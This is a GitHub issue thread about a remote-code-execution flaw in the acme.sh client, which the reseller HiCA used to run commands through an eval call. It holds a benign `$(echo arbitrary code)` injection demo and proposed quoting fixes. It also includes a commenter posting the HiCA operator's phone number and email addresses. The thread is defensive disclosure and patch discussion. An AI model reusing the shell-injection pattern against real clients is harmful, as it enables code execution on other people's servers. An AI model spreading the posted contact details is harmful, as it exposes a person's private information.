[image](https://private-user-images.githubusercontent.com/1128849/244537408-2edaea8a-8b45-44b4-9454-2283685ce106.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MTg4MzEsIm5iZiI6MTczNjUxODUzMSwicGF0aCI6Ii8xMTI4ODQ5LzI0NDUzNzQwOC0yZWRhZWE4YS04YjQ1LTQ0YjQtOTQ1NC0yMjgzNjg1Y2UxMDYucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMCUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTBUMTQxNTMxWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9MWIzMmMwZTdhNDcwNWY2ZjM1ZjFiZWQ0M2I3MTU2YTEwMjQ5M2E5ZjBlNDcwNTg4NjJlNjUyNjBiNTVjZmQ4MyZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.6k1kUkHeS1f6vVFRhnbZohcEvQEFefK-2UJMZ9Hlq18)  (Thank you [Aleksejs Popovs](https://twitter.com/aleksejspopovs)!)  Fortunately it appears to be benign. (However, all concerns related to RCE and ACME conformance still apply.) |
| --- |

 👍
19
 infogulch, IceCodeNew, quantumpacket, dbrennand, koluke, alimoezzi, My1, mauran, codsane, 4piu, and 9 more reacted with thumbs up emoji
 👀
3
 dbrennand, alimoezzi, and cngJo reacted with eyes emoji

All reactions

* 👍
  19 reactions
* 👀
  3 reactions

Sorry, something went wrong.

[![@Finkregh](https://avatars.githubusercontent.com/u/518090?s=80&v=4)](/Finkregh)

Copy link

### **[Finkregh](/Finkregh)** commented [Jun 9, 2023](#issuecomment-1584130531)

| Did you inform mozilla or google/microsoft/apple as the big CA bundlers? I had a look at <https://bugzilla.mozilla.org/buglist.cgi?product=CA%20Program&component=CA%20Certificate%20Compliance&resolution=---> but it might be hidden :) |
| --- |

All reactions

Sorry, something went wrong.

[![@Midar](https://avatars.githubusercontent.com/u/752237?s=80&u=81dfb9be718247c7664693c556bf3fdfb6715545&v=4)](/Midar)

Copy link

### **[Midar](/Midar)** commented [Jun 9, 2023](#issuecomment-1584138284)

| I think the bigger issue than them doing that is acme.sh allowing it. I think a fix for RCE is warranted, quickly. And then a proper security advisory / CVE. |
| --- |

 👍
47
 sid3windr, lnicola, codl, codsane, osirisinferi, Avamander, bluikko, QuantumGhost, bo0tzz, equill, and 37 more reacted with thumbs up emoji

All reactions

* 👍
  47 reactions

Sorry, something went wrong.

[![@PhotonQuantum](https://avatars.githubusercontent.com/u/18749973?s=80&u=cfac2255e076aba633ddc4ef790c80b131dfdd59&v=4)](/PhotonQuantum)

### This comment was marked as off-topic.

[Sign in to view](/login?return_to=https%3A%2F%2Fgithub.com%2Facmesh-official%2Facme.sh%2Fissues%2F4659)

[![@PPazderski](https://avatars.githubusercontent.com/u/13628240?s=80&v=4)](/PPazderski)

Copy link

### **[PPazderski](/PPazderski)** commented [Jun 9, 2023](#issuecomment-1584240542) • edited Loading

| Is it already clear *why* acme.sh executes the embedded command? If so I missed it in this issue.  Without further testing I would assume it is the following line   [acme.sh/acme.sh](https://github.com/acmesh-official/acme.sh/blob/0d25f7612bf37a42d9c4fcb1abc493b2a5e495c3/acme.sh#L4966)  Line 4966 in [0d25f76](/acmesh-official/acme.sh/commit/0d25f7612bf37a42d9c4fcb1abc493b2a5e495c3)   |  | if ! \_exec "chown -R \"$webroot\_owner\" \"$\_currentRoot/.well-known\""; then | | --- | --- |      Would match [@mholt](https://github.com/mholt)'s [log output](https://github.com/acmesh-official/acme.sh/issues/4659#issuecomment-1583533974). `$_currentRoot` contains the embedded code and the error message from `chown` indicates that the embedded command was executed at this point.  The `_exec` [function](https://github.com/acmesh-official/acme.sh/blob/0d25f7612bf37a42d9c4fcb1abc493b2a5e495c3/acme.sh#L4966) using `eval` seem rather dangerous in general. Maybe replace it with something like  ``` _exec() {   if [ -z "$_EXEC_TEMP_ERR" ]; then     _EXEC_TEMP_ERR="$(_mktemp)"   fi    exec_command="$1"   shift    if [ "$_EXEC_TEMP_ERR" ]; then     "$exec_command" "$@" 2>>"$_EXEC_TEMP_ERR"   else     "$exec_command" "$@"   fi }  ```  But would require some more work because some invocations of `_exec` rely on the implicit word splitting, e.g.   [acme.sh/acme.sh](https://github.com/acmesh-official/acme.sh/blob/0d25f7612bf37a42d9c4fcb1abc493b2a5e495c3/acme.sh#L3186)  Line 3186 in [0d25f76](/acmesh-official/acme.sh/commit/0d25f7612bf37a42d9c4fcb1abc493b2a5e495c3)   |  | if ! \_exec "nginx -t" >/dev/null; then | | --- | --- | |
| --- | --- | --- | --- | --- |

All reactions

Sorry, something went wrong.

[![@mvdan](https://avatars.githubusercontent.com/u/3576549?s=80&u=a35e1d2c507966ca8d1107301b3853db2bd87a7d&v=4)](/mvdan)

Copy link

### **[mvdan](/mvdan)** commented [Jun 9, 2023](#issuecomment-1584271905) • edited Loading

| I fully agree that `eval` is dangerous and should be avoided, though there might be an easier fix in the short term: proper quoting. With bash, that's `${var@Q}`, from `man bash`:  Q The expansion is a string that is the value of parameter quoted in a format that can be reused as input.  See the result:  ``` $ var='inject $(echo arbitrary code)'; eval "echo \"$var\"" inject arbitrary code $ var='inject $(echo arbitrary code)'; eval "echo ${var@Q}" inject $(echo arbitrary code)  ```  That's pure Bash syntax, no executing separate programs like coreutils. If we can't rely on Bash, then I think the only other alternative for safe quoting/escaping of input strings is `printf %q` from coreutils:  %q ARGUMENT is printed in a format that can be reused as shell input, escaping non-printable characters with the proposed POSIX $'' syntax.  ``` $ var='inject $(echo arbitrary code)'; eval "echo $(printf %q "$var")" inject $(echo arbitrary code)  ``` |
| --- |

 👍
13
 IceCodeNew, PhotonQuantum, sorz, dev-techmoe, imjasonh, lwpie, alpha14, jasoncodes, the-louie, thesamesam, and 3 more reacted with thumbs up emoji

All reactions

* 👍
  13 reactions

Sorry, something went wrong.

[![@PPazderski](https://avatars.githubusercontent.com/u/13628240?s=80&v=4)](/PPazderski)

Copy link

### **[PPazderski](/PPazderski)** commented [Jun 9, 2023](#issuecomment-1584287246) • edited Loading

| That's pure Bash syntax, no executing separate programs like coreutils. If we can't rely on Bash, then I think the only other alternative for safe quoting/escaping of input strings is `printf %q` from coreutils:  %q ARGUMENT is printed in a format that can be reused as shell input, escaping non-printable characters with the proposed POSIX $'' syntax.  ``` $ var='inject $(echo arbitrary code)'; eval "echo $(printf %q "$var")" inject $(echo arbitrary code)  ```  Could work with one addition: `printf` is usually a builtin which might not support `%q`. E.g. dash prints the following error:  ``` $ dash -c "printf '%q' '(a)'" dash: 1: printf: %q: invalid directive  ```  So you would need to explicit run the coreutils printf like `/usr/bin/printf ...` to skip the shell builtin. |
| --- |

 👍
1
 mvdan reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@Alan-Liang](https://avatars.githubusercontent.com/u/16379418?s=80&v=4)](/Alan-Liang)

### This comment was marked as off-topic.

[Sign in to view](/login?return_to=https%3A%2F%2Fgithub.com%2Facmesh-official%2Facme.sh%2Fissues%2F4659)

[![@mweinelt](https://avatars.githubusercontent.com/u/131599?s=40&v=4)](/mweinelt)
[mweinelt](/mweinelt)
mentioned this issue
[Jun 9, 2023](#ref-pullrequest-1749598012)

[acme-sh: mark vulnerable due to RCE
NixOS/nixpkgs#236820](/NixOS/nixpkgs/pull/236820)
 Closed

12 tasks

[![@mikma](https://avatars.githubusercontent.com/u/56008?s=80&v=4)](/mikma)

Copy link

### **[mikma](/mikma)** commented [Jun 9, 2023](#issuecomment-1584331945)

| That's pure Bash syntax, no executing separate programs like coreutils. If we can't rely on Bash, then I think the only other alternative for safe quoting/escaping of input strings is `printf %q` from coreutils:  Users of acme.sh on embedded systems with limited resources, such as small routers running OpenWrt, probably prefer installing printf from coreutils over bash which is much larger. |
| --- |

All reactions

Sorry, something went wrong.

[![@xiaohuilam](https://avatars.githubusercontent.com/u/6964962?s=80&u=f37377b9370095beed214216c16ce4bb69e99f1d&v=4)](/xiaohuilam)

Copy link

Contributor

### **[xiaohuilam](/xiaohuilam)** commented [Jun 9, 2023](#issuecomment-1584414218) • edited Loading

| Thanks to mholt to report this incident or bug to the community.  And please allow me to introduce my project.  this is Bruce, the founder of Quantum CA, we provides HiCA for non profit purpose, to provide ssl for free (RSA). We even donated 1000 USD to acme.sh last year to support the community developers, Except us any CA or reseller did this? And the validation process implemented a undisclosures bug, yes, we utilized. But our purpose is to makes the normal CA signing progress into acme.sh possible. We agree this is harmful to acme.sh community but we didn’t inject any attacking codes since the first day of HiCA and to today. Mohlt’s request signing analysis can proof this.  The code execution way we utilized is to implement a flexibility cert provider which can enroll by acme.sh likely letsencrypt. And this ability we can’t be granted from CAs.(after all, we are only a resellers, the Fully rfc8555 can be only provided by CA, because they need to check all challenges and it’s incompatible with pki-validation ways).  finally, we closed HiCA project and keep this before the community investigation finished.  sorry to free users of HiCA. |
| --- |

 👎
28
 boomer41, davidbb, LeviMarvin, iammeken, lumedmh, qbe, URARUA, shanoaice, Xe, krishukr, and 18 more reacted with thumbs down emoji
 😄
2
 qbe and chimon89 reacted with laugh emoji
 🎉
1
 qbe reacted with hooray emoji

All reactions

* 👎
  28 reactions
* 😄
  2 reactions
* 🎉
  1 reaction

Sorry, something went wrong.

[![@shankerwangmiao](https://avatars.githubusercontent.com/u/6825907?s=80&v=4)](/shankerwangmiao)

Copy link

### **[shankerwangmiao](/shankerwangmiao)** commented [Jun 9, 2023](#issuecomment-1584425753) • edited Loading

| We now have [another confirmation on Twitter](https://twitter.com/aleksejspopovs/status/1666955050696966148) that remote code is executed and a glimpse into what the script is:  [image](https://user-images.githubusercontent.com/1128849/244537408-2edaea8a-8b45-44b4-9454-2283685ce106.png)  (Thank you [Aleksejs Popovs](https://twitter.com/aleksejspopovs)!)  Fortunately it appears to be benign. (However, all concerns related to RCE and ACME conformance still apply.)  I would like to add some my speculations on the possible purpose of that CA.  It seems that HI-CA is not a certificate issuing CA, but a reseller or broker of another well-trusted CA. The former “CA” obtains some kind of non-standard automated certificate issuing interface from the latter CA. HI-CA wants to “wrap” that interface into something that looks like ACME.  However, this is not possible because: 1. the “well-known” path for the two certificate issuing process is different, one is “acme-challenge”; the other is “pki-validation”. 2. the content of the file to be put in “pki-validation/” is an opaque text given by the certificate issuing CA, while the content of the ACME challenge file should be a cryptographic calculating result which both the ACME client and the CA agree on.  As a result, HI-CA “invented” such a method exploiting `acme.sh` to put the correct response file given by the real certificate issuing CA into the correct place, with great “innovation”. |
| --- |

All reactions

Sorry, something went wrong.

[![@LeviMarvin](https://avatars.githubusercontent.com/u/72605966?s=80&u=66386693132a46e3f1ba798f03d58e914ffa1ec9&v=4)](/LeviMarvin)

Copy link

### **[LeviMarvin](/LeviMarvin)** commented [Jun 9, 2023](#issuecomment-1584432903)

| We must forbidden the HiCA. It is destroying the security of ACME. |
| --- |

 👍
14
 iammeken, lumedmh, yingziwu, shanoaice, krishukr, LeviMarvin, tkapias, laosb, semaja2, andrewnicolalde, and 4 more reacted with thumbs up emoji
 👎
1
 komuw reacted with thumbs down emoji

All reactions

* 👍
  14 reactions
* 👎
  1 reaction

Sorry, something went wrong.

[![@xiaohuilam](https://avatars.githubusercontent.com/u/6964962?s=80&u=f37377b9370095beed214216c16ce4bb69e99f1d&v=4)](/xiaohuilam)

Copy link

Contributor

### **[xiaohuilam](/xiaohuilam)** commented [Jun 9, 2023](#issuecomment-1584439442)

| And the mail template in HiCA, because it’s included in our another project, which co operated with SSL.com, and in the HiCA mail messages we forget to override the Laravel mail layout.  I have lack time invest to the HiCA project. so keep the mail messages displays until today.  The QRCode display isn’t critical bug of acme.sh, they just display error messages server output, no code execution risky. We used to provide ssl for free only for rsa, and few users will met this message. But months ago acme.sh changed key type defaultly EC, this messages shows and we’re also planning to deploy a new version to provide cert free for EC, but timing lack reason you know, didn’t implement. [IMG_7913](https://private-user-images.githubusercontent.com/6964962/244681141-9ea8e3e2-3e10-43a6-a296-1a0e508d66eb.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MTg4MzEsIm5iZiI6MTczNjUxODUzMSwicGF0aCI6Ii82OTY0OTYyLzI0NDY4MTE0MS05ZWE4ZTNlMi0zZTEwLTQzYTYtYTI5Ni0xYTBlNTA4ZDY2ZWIucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMCUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTBUMTQxNTMxWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9MWY4NjY5YjRhMzdiNThmMDY5M2Q2MWNmNTJiMzE3YTQyNDc3ZjcxYjZmNzYxYzY2MDJkZWQ5MDk1NDkzNGQxYiZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.PL7NmPtzQVHWQFgnynXYY_L6v7W4pS7hYEuV_V2UPmc)  This is an experimental project, we even don’t have time to fix the problem about the payment gateway expiration. (QR code is not executable for payment). So this project is totally a nonprofit. |
| --- |

 👎
13
 qbe, boomer41, LaoshuBaby, shanoaice, iammeken, krishukr, undefined-moe, LeviMarvin, laosb, lumedmh, and 3 more reacted with thumbs down emoji
 😄
1
 qbe reacted with laugh emoji
 🎉
1
 qbe reacted with hooray emoji

All reactions

* 👎
  13 reactions
* 😄
  1 reaction
* 🎉
  1 reaction

Sorry, something went wrong.

[![@xiaohuilam](https://avatars.githubusercontent.com/u/6964962?s=80&u=f37377b9370095beed214216c16ce4bb69e99f1d&v=4)](/xiaohuilam)

Copy link

Contributor

### **[xiaohuilam](/xiaohuilam)** commented [Jun 9, 2023](#issuecomment-1584440327)

| We must forbidden the HiCA. It is destroying the security of ACME.  you have no necessary to do this, we have turned all servers down. |
| --- |

 👎
13
 qbe, boomer41, LaoshuBaby, lumedmh, shanoaice, iammeken, isyekong, undefined-moe, LeviMarvin, alkoclick, and 3 more reacted with thumbs down emoji
 😄
2
 qbe and xiaohuilam reacted with laugh emoji
 🎉
2
 qbe and xiaohuilam reacted with hooray emoji

All reactions

* 👎
  13 reactions
* 😄
  2 reactions
* 🎉
  2 reactions

Sorry, something went wrong.

[gentoo-bot](/gentoo-bot)
pushed a commit
to gentoo/gentoo
that referenced
this issue
[Jun 9, 2023](#ref-commit-eaf6574)
[![@thesamesam](https://avatars.githubusercontent.com/u/11667869?s=40&u=f2fd8b8e54abb2f4cb97222f8c4762ae076e3847&v=4)](/thesamesam)

`[profiles: mask app-crypt/acme-sh](/gentoo/gentoo/commit/eaf65747638e7864fc50d9149cde5271893a7365 "profiles: mask app-crypt/acme-sh

Bug: https://github.com/acmesh-official/acme.sh/issues/4659
Bug: https://bugs.gentoo.org/908104
Signed-off-by: Sam James <sam@gentoo.org>")`
…

`[eaf6574](/gentoo/gentoo/commit/eaf65747638e7864fc50d9149cde5271893a7365)`

```
Bug: [acmesh-official/acme.sh#4659](https://github.com/acmesh-official/acme.sh/issues/4659)
Bug: <https://bugs.gentoo.org/908104>
Signed-off-by: Sam James <sam@gentoo.org>
```

[![@qwerzl](https://avatars.githubusercontent.com/u/46770502?s=80&u=ee4125217560161ec9943476ff21a4ae19596a38&v=4)](/qwerzl)

Copy link

### **[qwerzl](/qwerzl)** commented [Jun 9, 2023](#issuecomment-1584460325)

| You actually have good intentions. However you need to understand that this world needs regulations to work. |
| --- |

 🎉
5
 xiaohuilam, undefined-moe, Wittoy, zhongfu, and Mosney reacted with hooray emoji

All reactions

* 🎉
  5 reactions

Sorry, something went wrong.

[![@Neilpang](https://avatars.githubusercontent.com/u/8305679?s=80&v=4)](/Neilpang)

Copy link

Member

### **[Neilpang](/Neilpang)** commented [Jun 9, 2023](#issuecomment-1584465169)

| as a quick fix, I just removed the problematic "\_exec" from that line. |
| --- |

 👍
3
 xiaohuilam, LeviMarvin, and qbe reacted with thumbs up emoji
 ❤️
1
 tedb reacted with heart emoji

All reactions

* 👍
  3 reactions
* ❤️
  1 reaction

Sorry, something went wrong.

[![@Neilpang](https://avatars.githubusercontent.com/u/8305679?s=40&v=4)](/Neilpang)
[Neilpang](/Neilpang)
closed this as [completed](/acmesh-official/acme.sh/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
in
`[4c30250](/acmesh-official/acme.sh/commit/4c30250782ff7440ca5ceeddb066a67ca450fcc7)`
[Jun 9, 2023](#event-9483715402)

[![@Neilpang](https://avatars.githubusercontent.com/u/8305679?s=80&v=4)](/Neilpang)

Copy link

Member

### **[Neilpang](/Neilpang)** commented [Jun 9, 2023](#issuecomment-1584469832)

| merged to master. new release will be soon. |
| --- |

All reactions

Sorry, something went wrong.

[![@iammeken](https://avatars.githubusercontent.com/u/67883286?s=80&u=a5efa30d17da42e000d274722391f7458bab4fd1&v=4)](/iammeken)

Copy link

### **[iammeken](/iammeken)** commented [Jun 9, 2023](#issuecomment-1584471433)

| You should not close this issue at this stage. |
| --- |

 👍
4
 boomer41, lumedmh, zhongfu, and Mosney reacted with thumbs up emoji

All reactions

* 👍
  4 reactions

Sorry, something went wrong.

[![@Neilpang](https://avatars.githubusercontent.com/u/8305679?s=40&v=4)](/Neilpang)
[Neilpang](/Neilpang)
reopened this
[Jun 9, 2023](#event-9483735772)

1 hidden item

Load more…

[Neilpang](/Neilpang)
pushed a commit
that referenced
this issue
[Jun 9, 2023](#ref-commit-327e2fb)

`[remove all exec.](/acmesh-official/acme.sh/commit/327e2fb0a4bdbe4b75339e1cad6d20bda29318d6 "remove all exec.
https://github.com/acmesh-official/acme.sh/issues/4659")`
…

`[327e2fb](/acmesh-official/acme.sh/commit/327e2fb0a4bdbe4b75339e1cad6d20bda29318d6)`

```
[#4659](https://github.com/acmesh-official/acme.sh/issues/4659)
```

[![@soliton-](https://avatars.githubusercontent.com/u/3579817?s=40&v=4)](/soliton-)
[soliton-](/soliton-)
mentioned this issue
[Jun 9, 2023](#ref-pullrequest-1749789169)

[Avoid unnecessary eval
#4662](/acmesh-official/acme.sh/pull/4662)
 Closed

[![@BeSafee](https://avatars.githubusercontent.com/u/136086436?s=80&v=4)](/BeSafee)

Copy link

### **[BeSafee](/BeSafee)** commented [Jun 9, 2023](#issuecomment-1584488230)

| HiCA didn't respond properly to this issue, incredible that they shut down all their servers and official website. |
| --- |

 👍
7
 laosb, LeviMarvin, wojtekregis, zhongfu, Losses, bunnyblueair, and Mosney reacted with thumbs up emoji
 👎
1
 xiaohuilam reacted with thumbs down emoji

All reactions

* 👍
  7 reactions
* 👎
  1 reaction

Sorry, something went wrong.

[![@xiaohuilam](https://avatars.githubusercontent.com/u/6964962?s=80&u=f37377b9370095beed214216c16ce4bb69e99f1d&v=4)](/xiaohuilam)

Copy link

Contributor

### **[xiaohuilam](/xiaohuilam)** commented [Jun 9, 2023](#issuecomment-1584495685) • edited Loading

| HiCA didn't respond properly to this issue, incredible that they shut down all their servers and official website.  Which question I didn’t reply, May I ask? We shutdown servers is not only to reduce impact for that RCA, but also reduce billing cost by DDoS happen hours ago. |
| --- |

All reactions

Sorry, something went wrong.

[![@LeviMarvin](https://avatars.githubusercontent.com/u/72605966?s=80&u=66386693132a46e3f1ba798f03d58e914ffa1ec9&v=4)](/LeviMarvin)

Copy link

### **[LeviMarvin](/LeviMarvin)** commented [Jun 9, 2023](#issuecomment-1584502258)

| Is there any information about HiCA's certificate of CA which like sha1-hash and keyid, so that I can revoke/disable the HiCA trust-chain in local. And I think this issue should be reported to public, and make decision for revoking the CA certificate of HiCA to all people. |
| --- |

 👍
1
 LeviMarvin reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@BeSafee](https://avatars.githubusercontent.com/u/136086436?s=80&v=4)](/BeSafee)

Copy link

### **[BeSafee](/BeSafee)** commented [Jun 9, 2023](#issuecomment-1584502723)

| And their payment gateway (<https://tencentcloud.accelerate.pki.plus/>) redirects to the White House website. The whole process is opaque and worrying. Hope HiCA can give a formal response to this issue. |
| --- |

 👍
2
 LeviMarvin and Mosney reacted with thumbs up emoji

All reactions

* 👍
  2 reactions

Sorry, something went wrong.

[![@xiaohuilam](https://avatars.githubusercontent.com/u/6964962?s=80&u=f37377b9370095beed214216c16ce4bb69e99f1d&v=4)](/xiaohuilam)

Copy link

Contributor

### **[xiaohuilam](/xiaohuilam)** commented [Jun 9, 2023](#issuecomment-1584503675)

| And their payment gateway (<https://tencentcloud.accelerate.pki.plus/>) redirects to the White House website. The whole process is opaque and worrying. Hope HiCA can give a formal response to this issue.  This is the WAF rule. |
| --- |

 👎
1
 bunnyblueair reacted with thumbs down emoji
 😄
2
 komuw and Misterio77 reacted with laugh emoji
 🎉
1
 komuw reacted with hooray emoji

All reactions

* 👎
  1 reaction
* 😄
  2 reactions
* 🎉
  1 reaction

Sorry, something went wrong.

[![@j-mie](https://avatars.githubusercontent.com/u/1857320?s=80&u=d5b43f2d599d6c85bd461d69fbf672d0a5821710&v=4)](/j-mie)

Copy link

### **[j-mie](/j-mie)** commented [Jun 9, 2023](#issuecomment-1584512146)

| [@Neilpang](https://github.com/Neilpang) You should probably request a CVE for this. |
| --- |

 👍
2
 matty234 and alexanderkjall reacted with thumbs up emoji

All reactions

* 👍
  2 reactions

Sorry, something went wrong.

[![@komuw](https://avatars.githubusercontent.com/u/5163857?s=80&u=43f609098ad50ac90777ac0ba965c0add877458d&v=4)](/komuw)

Copy link

### **[komuw](/komuw)** commented [Jun 9, 2023](#issuecomment-1584513904)

| And their payment gateway (<https://tencentcloud.accelerate.pki.plus/>) redirects to the White House website. The whole process is opaque and worrying. Hope HiCA can give a formal response to this issue.  This is the WAF rule.  🤣 well played. |
| --- |

All reactions

Sorry, something went wrong.

[![@boomer41](https://avatars.githubusercontent.com/u/1922978?s=80&u=b7199702d8e30989a1f836a5bf2d9f6c2c3194a6&v=4)](/boomer41)

Copy link

### **[boomer41](/boomer41)** commented [Jun 9, 2023](#issuecomment-1584515104)

| Which question I didn’t reply, May I ask?  As you see yourself as a proper CA, the following text is based on that fact. Most publicly trusted CAs thesedays go through Mozilla's CA Certificate Program [1], which exhibits strict policies around required communication around issues.  See for example this (minor) incident, where a CA failed to publicly disclose one of their intermediate certificates to the public in a timely manner: <https://bugzilla.mozilla.org/show_bug.cgi?id=1784820> Especially the last comment by the CA shows how to properly answer to such a problem. They publicly disclose what ultimately was the problem and how the CA wants to proceed, and how they ensure these problems will not occur again. If the CA would fail to provide these statements, it ultimately would get removed from the program, as you cannot and must not play with the trust Mozilla has given that CA under any circumstances.  Operating any kind of CA where the certificates are trusted globally is no joke, because that CA can potentially fake certificates for banking services and such.  However, in my opinion, just yoinking your services down and creating some WAF rules that redirect to the white house (why even THAT site? Show a 403 forbidden or something) is not something I personally see trust in.  [1] <https://wiki.mozilla.org/CA> |
| --- |

 👍
6
 matty234, iammeken, LeviMarvin, bbbush, thesamesam, and Mosney reacted with thumbs up emoji

All reactions

* 👍
  6 reactions

Sorry, something went wrong.

[![@BeSafee](https://avatars.githubusercontent.com/u/136086436?s=80&v=4)](/BeSafee)

Copy link

### **[BeSafee](/BeSafee)** commented [Jun 9, 2023](#issuecomment-1584519718)

| In the Google snapshot I see HiCA official recommends to run acme.sh as root user. |
| --- |

 😄
1
 Mosney reacted with laugh emoji

All reactions

* 😄
  1 reaction

Sorry, something went wrong.

[![@Midar](https://avatars.githubusercontent.com/u/752237?s=80&u=81dfb9be718247c7664693c556bf3fdfb6715545&v=4)](/Midar)

Copy link

### **[Midar](/Midar)** commented [Jun 9, 2023](#issuecomment-1584520710)

| Hey, um, this is the acme.sh bug tracker. This bug is about an RCE in acme.sh, and possibly there are other places in the code with the same issue. Can we please keep the discussion on that rather than some random CA that just happened to exploit this RCE? The CA is not the problem in this bug (take this to the CA forum), but the defect in the code is.  Personally, I’m not using this CA, but am now getting spammed for this because people abuse this bug to talk about some CA rather than the bug - and I guess a lot of others are in the same situation as I. Use the correct venue please. |
| --- |

 👍
9
 boomer41, codl, jani, ras52, shankerwangmiao, mvdan, PhotonQuantum, Alan-Liang, and Mosney reacted with thumbs up emoji

All reactions

* 👍
  9 reactions

Sorry, something went wrong.

[![@xiaohuilam](https://avatars.githubusercontent.com/u/6964962?s=80&u=f37377b9370095beed214216c16ce4bb69e99f1d&v=4)](/xiaohuilam)

Copy link

Contributor

### **[xiaohuilam](/xiaohuilam)** commented [Jun 9, 2023](#issuecomment-1584520775) • edited Loading

| Which question I didn’t reply, May I ask?  As you see yourself as a proper CA, the following text is based on that fact. Most publicly trusted CAs thesedays go through Mozilla's CA Certificate Program [1], which exhibits strict policies around required communication around issues.  See for example this (minor) incident, where a CA failed to publicly disclose one of their intermediate certificates to the public in a timely manner: <https://bugzilla.mozilla.org/show_bug.cgi?id=1784820> Especially the last comment by the CA shows how to properly answer to such a problem. They publicly disclose what ultimately was the problem and how the CA wants to proceed, and how they ensure these problems will not occur again. If the CA would fail to provide these statements, it ultimately would get removed from the program, as you cannot and must not play with the trust Mozilla has given that CA under any circumstances.  Operating any kind of CA where the certificates are trusted globally is no joke, because that CA can potentially fake certificates for banking services and such.  However, in my opinion, just yoinking your services down and creating some WAF rules that redirect to the white house (why even THAT site? Show a 403 forbidden or something) is not something I personally see trust in.  [1] <https://wiki.mozilla.org/CA>  We ARE NOT a CA. Our certs is issued by SSL.com、Sectigo、GTS，by be compliant their BR validation requirements.  We ARE reseller or subscriber of those CAs, so we don’t have needed to match webtrust standards because we don’t provide any PKI infrastructure. |
| --- |

 👎
2
 boomer41 and LeviMarvin reacted with thumbs down emoji
 😄
1
 codl reacted with laugh emoji

All reactions

* 👎
  2 reactions
* 😄
  1 reaction

Sorry, something went wrong.

[![@LeviMarvin](https://avatars.githubusercontent.com/u/72605966?s=80&u=66386693132a46e3f1ba798f03d58e914ffa1ec9&v=4)](/LeviMarvin)

Copy link

### **[LeviMarvin](/LeviMarvin)** commented [Jun 9, 2023](#issuecomment-1584524210) • edited Loading

| [@xiaohuilam](https://github.com/xiaohuilam) Your company (or your CA's company) is registered in China, the code of company is `91500108MAACDXG09T` and contact phone number is `+86 17099911119`, contact mail is `sslcertificate@foxmail.com`/`contact@xunsign.com`. your official website `www1.hi.cn` have not used the certificate signed from your own CA. Your company is selling of prepare to sell PKI services after permitted by government. So we have reason believe that your are an CA. |
| --- |

 👍
1
 LeviMarvin reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@xiaohuilam](https://avatars.githubusercontent.com/u/6964962?s=80&u=f37377b9370095beed214216c16ce4bb69e99f1d&v=4)](/xiaohuilam)

Copy link

Contributor

### **[xiaohuilam](/xiaohuilam)** commented [Jun 9, 2023](#issuecomment-1584526323) • edited Loading

| In the Google snapshot I see HiCA official recommends to run acme.sh as root user. [@BeSafee](https://github.com/BeSafee)  It’s tutorial copied from others article. NOT we meant.  the source article is http://[web.archive.org/web/20230201113221/https://blog.freessl.cn/acme-quick-start/](https://blog.freessl.cn/acme-quick-start/). |
| --- |

All reactions

Sorry, something went wrong.

[![@LeviMarvin](https://avatars.githubusercontent.com/u/72605966?s=80&u=66386693132a46e3f1ba798f03d58e914ffa1ec9&v=4)](/LeviMarvin)

Copy link

### **[LeviMarvin](/LeviMarvin)** commented [Jun 9, 2023](#issuecomment-1584531292)

| [@xiaohuilam](https://github.com/xiaohuilam) If you are not a CA, you have NOT ANY reasons to sell the certificate or publish the payment information with ACME users. And in your website, you said "We provide OCSP in China Mainland", how did you do that? The OCSP services must be operated by CA. |
| --- |

 👀
1
 Mosney reacted with eyes emoji

All reactions

* 👀
  1 reaction

Sorry, something went wrong.

[![@xiaohuilam](https://avatars.githubusercontent.com/u/6964962?s=80&u=f37377b9370095beed214216c16ce4bb69e99f1d&v=4)](/xiaohuilam)

Copy link

Contributor

### **[xiaohuilam](/xiaohuilam)** commented [Jun 9, 2023](#issuecomment-1584534072)

| [@xiaohuilam](https://github.com/xiaohuilam) Your company (or your CA's company) is registered in China, the code of company is `91500108MAACDXG09T` and contact phone number is `+86 17099911119`, contact mail is `sslcertificate@foxmail.com`/`contact@xunsign.com`. your official website `www1.hi.cn` have not used the certificate signed from your own CA. Your company is selling of prepare to sell PKI services after permitted by government. So we have reason believe that your are an CA.  We're not a CA, we have no public key infrastructures including public CA or private CA. And a kind remind, submitting information here such as telephone、addresses that not evidence without our consent will violate China citizen privacy. |
| --- |

 👎
2
 bunnyblueair and LeviMarvin reacted with thumbs down emoji

All reactions

* 👎
  2 reactions

Sorry, something went wrong.

[![@boomer41](https://avatars.githubusercontent.com/u/1922978?s=80&u=b7199702d8e30989a1f836a5bf2d9f6c2c3194a6&v=4)](/boomer41)

Copy link

### **[boomer41](/boomer41)** commented [Jun 9, 2023](#issuecomment-1584534356)

